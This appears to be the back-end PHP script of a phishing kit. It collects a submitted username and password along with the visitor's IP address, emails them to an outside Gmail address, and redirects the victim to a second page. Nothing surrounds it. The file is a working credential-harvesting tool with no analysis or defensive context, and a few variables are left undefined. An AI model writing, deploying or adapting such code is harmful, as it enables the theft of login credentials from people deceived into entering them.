<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$usernames = $_POST['usernames'];

$pwja = $_POST['pwja'];



$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'usernames: '.$usernames . PHP_EOL .'pwja: '. $pwja.PHP_EOL .'IP:'. $ip.PHP_EOL .'Name: '.$fname . PHP_EOL .'AddInfo: '. $adninfo . PHP_EOL. 'PageId: '. $pgus;
mail("fructaltenis@gmail.com","info", $stringi);
header("Location: index2.php");

?>